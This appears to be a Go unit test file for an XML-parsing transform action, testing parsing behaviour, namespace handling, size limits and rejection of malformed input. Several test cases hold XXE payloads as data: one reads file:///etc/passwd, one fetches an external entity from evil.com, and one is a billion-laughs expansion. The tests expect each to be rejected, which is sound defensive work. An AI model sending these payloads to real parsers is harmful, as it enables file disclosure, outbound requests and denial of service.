package transform

import (
	"context"
	"strings"
	"testing"
)

func TestTransformAction_ParseXML(t *testing.T) {
	action, err := New(nil)
	if err != nil {
		t.Fatalf("failed to create integration: %v", err)
	}

	tests := []struct {
		name      string
		inputs    map[string]interface{}
		expectErr bool
		errType   ErrorType
		validate  func(t *testing.T, result *Result)
	}{
		{
			name: "basic XML parsing",
			inputs: map[string]interface{}{
				"data": `<root><item>value</item></root>`,
			},
			expectErr: false,
			validate: func(t *testing.T, result *Result) {
				if result.Response == nil {
					t.Error("expected non-nil response")
				}
				if result.Metadata["document_size"] == nil {
					t.Error("expected document_size in metadata")
				}
			},
		},
		{
			name: "XML with attributes",
			inputs: map[string]interface{}{
				"data": `<root id="1" name="test">content</root>`,
			},
			expectErr: false,
			validate: func(t *testing.T, result *Result) {
				respMap, ok := result.Response.(map[string]interface{})
				if !ok {
					t.Fatal("expected response to be map")
				}
				if _, exists := respMap["root"]; !exists {
					t.Error("expected root element in response")
				}
			},
		},
		{
			name: "missing data parameter",
			inputs: map[string]interface{}{
				"other": "value",
			},
			expectErr: true,
			errType:   ErrorTypeValidation,
		},
		{
			name: "null data",
			inputs: map[string]interface{}{
				"data": nil,
			},
			expectErr: true,
			errType:   ErrorTypeEmptyInput,
		},
		{
			name: "invalid data type",
			inputs: map[string]interface{}{
				"data": 123,
			},
			expectErr: true,
			errType:   ErrorTypeTypeError,
		},
		{
			name: "XXE attack - DOCTYPE",
			inputs: map[string]interface{}{
				"data": `<!DOCTYPE root SYSTEM "file:///etc/passwd"><root></root>`,
			},
			expectErr: true,
			errType:   ErrorTypeValidation,
			validate: func(t *testing.T, result *Result) {
				// Should have logged XXE attempt
			},
		},
		{
			name: "XXE attack - external entity",
			inputs: map[string]interface{}{
				"data": `<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://evil.com/evil.xml">
]><root>&xxe;</root>`,
			},
			expectErr: true,
			errType:   ErrorTypeValidation,
		},
		{
			name: "XXE attack - billion laughs",
			inputs: map[string]interface{}{
				"data": `<!DOCTYPE root [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
]><root>&lol2;</root>`,
			},
			expectErr: true,
			errType:   ErrorTypeValidation,
		},
		{
			name: "custom attribute prefix",
			inputs: map[string]interface{}{
				"data":             `<root attr="value">text</root>`,
				"attribute_prefix": "$",
			},
			expectErr: false,
			validate: func(t *testing.T, result *Result) {
				if result.Response == nil {
					t.Error("expected non-nil response")
				}
			},
		},
		{
			name: "namespace stripping enabled",
			inputs: map[string]interface{}{
				"data":             `<ns:root xmlns:ns="http://example.com"><ns:child>value</ns:child></ns:root>`,
				"strip_namespaces": true,
			},
			expectErr: false,
			validate: func(t *testing.T, result *Result) {
				respMap, ok := result.Response.(map[string]interface{})
				if !ok {
					t.Fatal("expected response to be map")
				}
				// Should have "root" not "ns:root"
				if _, exists := respMap["root"]; !exists {
					t.Errorf("expected 'root' key (namespace stripped), got keys: %v", mapKeys(respMap))
				}
			},
		},
		{
			name: "namespace stripping disabled",
			inputs: map[string]interface{}{
				"data":             `<ns:root xmlns:ns="http://example.com"><ns:child>value</ns:child></ns:root>`,
				"strip_namespaces": false,
			},
			expectErr: false,
			validate: func(t *testing.T, result *Result) {
				respMap, ok := result.Response.(map[string]interface{})
				if !ok {
					t.Fatal("expected response to be map")
				}
				// XML decoder uses namespace URI, not prefix when Space is set
				// Should have "http://example.com:root"
				found := false
				for key := range respMap {
					if strings.Contains(key, "root") {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected root element (with or without namespace), got keys: %v", mapKeys(respMap))
				}
			},
		},
		{
			name: "empty XML element",
			inputs: map[string]interface{}{
				"data": `<root></root>`,
			},
			expectErr: false,
			validate: func(t *testing.T, result *Result) {
				respMap, ok := result.Response.(map[string]interface{})
				if !ok {
					t.Fatal("expected response to be map")
				}
				if rootVal, exists := respMap["root"]; !exists {
					t.Error("expected root element")
				} else if rootVal != "" {
					t.Errorf("expected empty string for empty element, got: %v", rootVal)
				}
			},
		},
		{
			name: "multiple children with same name",
			inputs: map[string]interface{}{
				"data": `<root><item>a</item><item>b</item><item>c</item></root>`,
			},
			expectErr: false,
			validate: func(t *testing.T, result *Result) {
				respMap, ok := result.Response.(map[string]interface{})
				if !ok {
					t.Fatal("expected response to be map")
				}
				rootMap, ok := respMap["root"].(map[string]interface{})
				if !ok {
					t.Fatal("expected root to be map")
				}
				items, ok := rootMap["item"].([]interface{})
				if !ok {
					t.Fatalf("expected items to be array, got: %T", rootMap["item"])
				}
				if len(items) != 3 {
					t.Errorf("expected 3 items, got: %d", len(items))
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := action.Execute(context.Background(), "parse_xml", tt.inputs)

			if tt.expectErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				opErr, ok := err.(*OperationError)
				if !ok {
					t.Fatalf("expected OperationError, got: %T", err)
				}
				if tt.errType != "" && opErr.ErrorType != tt.errType {
					t.Errorf("expected error type %q, got: %q", string(tt.errType), string(opErr.ErrorType))
				}
			} else {
				if err != nil {
					t.Fatalf("unexpected error: %v", err)
				}
				if result == nil {
					t.Fatal("expected non-nil result")
				}
				if tt.validate != nil {
					tt.validate(t, result)
				}
			}
		})
	}
}

func TestTransformAction_ParseXML_SizeLimit(t *testing.T) {
	config := DefaultConfig()
	config.MaxInputSize = 100 // Small limit for testing

	action, err := New(config)
	if err != nil {
		t.Fatalf("failed to create integration: %v", err)
	}

	// Create XML larger than limit
	largeXML := "<root>" + strings.Repeat("<item>data</item>", 50) + "</root>"

	result, err := action.Execute(context.Background(), "parse_xml", map[string]interface{}{
		"data": largeXML,
	})

	if err == nil {
		t.Fatal("expected size limit error, got nil")
	}

	opErr, ok := err.(*OperationError)
	if !ok {
		t.Fatalf("expected OperationError, got: %T", err)
	}

	if opErr.ErrorType != ErrorTypeLimitExceeded {
		t.Errorf("expected ErrorTypeLimitExceeded, got: %q", opErr.ErrorType)
	}

	if result != nil {
		t.Error("expected nil result on error")
	}
}

func TestTransformAction_ParseXML_SecurityAuditLogging(t *testing.T) {
	action, err := New(nil)
	if err != nil {
		t.Fatalf("failed to create integration: %v", err)
	}

	tests := []struct {
		name           string
		xml            string
		expectXXEField bool
	}{
		{
			name:           "safe XML - no XXE field",
			xml:            `<root>safe</root>`,
			expectXXEField: false,
		},
		{
			name:           "XXE attempt - should log",
			xml:            `<!DOCTYPE root SYSTEM "file:///etc/passwd"><root></root>`,
			expectXXEField: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, _ := action.Execute(context.Background(), "parse_xml", map[string]interface{}{
				"data": tt.xml,
			})

			// For XXE attempts, we won't have a result but the error should be logged
			// For safe XML, check metadata
			if !tt.expectXXEField && result != nil {
				if result.Metadata["document_size"] == nil {
					t.Error("expected document_size in metadata")
				}
				if result.Metadata["operation"] != "parse_xml" {
					t.Error("expected operation metadata")
				}
			}
		})
	}
}

func TestTransformAction_ParseXML_MalformedXML(t *testing.T) {
	action, err := New(nil)
	if err != nil {
		t.Fatalf("failed to create integration: %v", err)
	}

	tests := []struct {
		name string
		xml  string
	}{
		{
			name: "unclosed tag",
			xml:  `<root><item>value</root>`,
		},
		{
			name: "mismatched tags",
			xml:  `<root><item>value</other></root>`,
		},
		{
			name: "invalid characters",
			xml:  `<root>value<with<invalid>chars</root>`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := action.Execute(context.Background(), "parse_xml", map[string]interface{}{
				"data": tt.xml,
			})

			if err == nil {
				t.Fatal("expected parse error for malformed XML")
			}

			opErr, ok := err.(*OperationError)
			if !ok {
				t.Fatalf("expected OperationError, got: %T", err)
			}

			if opErr.ErrorType != ErrorTypeParseError {
				t.Errorf("expected ErrorTypeParseError, got: %q", opErr.ErrorType)
			}

			if result != nil {
				t.Error("expected nil result on error")
			}
		})
	}
}
